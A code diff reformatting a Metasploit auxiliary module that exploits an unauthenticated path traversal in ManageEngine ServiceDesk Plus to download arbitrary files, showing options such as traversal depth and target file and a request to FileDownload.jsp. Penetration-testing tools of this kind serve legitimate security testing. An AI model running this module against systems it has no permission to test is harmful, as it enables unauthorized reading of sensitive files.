@@ -8,23 +8,30 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "ManageEngine ServiceDesk Plus Path Traversal",
-      'Description'    => %q{
-        This module exploits an unauthenticated path traversal vulnerability found in ManageEngine
-        ServiceDesk Plus build 9110 and lower. The module will retrieve any file on the filesystem
-        with the same privileges as Support Center Plus is running. On Windows, files can be retrieved
-        with SYSTEM privileges. The issue has been resolved in ServiceDesk Plus build 91111 (issue SD-60283).
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module
-      'References'     =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "ManageEngine ServiceDesk Plus Path Traversal",
+        'Description' => %q{
+          This module exploits an unauthenticated path traversal vulnerability found in ManageEngine
+          ServiceDesk Plus build 9110 and lower. The module will retrieve any file on the filesystem
+          with the same privileges as Support Center Plus is running. On Windows, files can be retrieved
+          with SYSTEM privileges. The issue has been resolved in ServiceDesk Plus build 91111 (issue SD-60283).
+        },
+        'License' => MSF_LICENSE,
+        'Author' => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module
+        'References' => [
           ['URL', 'https://www.manageengine.com/products/service-desk/readme-9.1.html'],
         ],
-      'DisclosureDate' => '2015-10-03'
-    ))
+        'DisclosureDate' => '2015-10-03',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -32,7 +39,8 @@ class MetasploitModule < Msf::Auxiliary
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ]),
         OptString.new('TARGETURI', [true, 'The base path to the ServiceDesk Plus installation', '/']),
         OptString.new('FILE', [true, 'The file to retrieve', '/windows/win.ini'])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -44,7 +52,7 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Retrieving file #{datastore['FILE']}")
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => normalize_uri(uri, "workorder", "FileDownload.jsp"),
+      'uri' => normalize_uri(uri, "workorder", "FileDownload.jsp"),
       'vars_get' =>
       {
         'module' => 'support',
@@ -72,8 +80,7 @@ class MetasploitModule < Msf::Auxiliary
         print_good("File saved in: #{p}")
       end
     else
-        vprint_error("Connection timed out")
+      vprint_error("Connection timed out")
     end
   end
 end
-
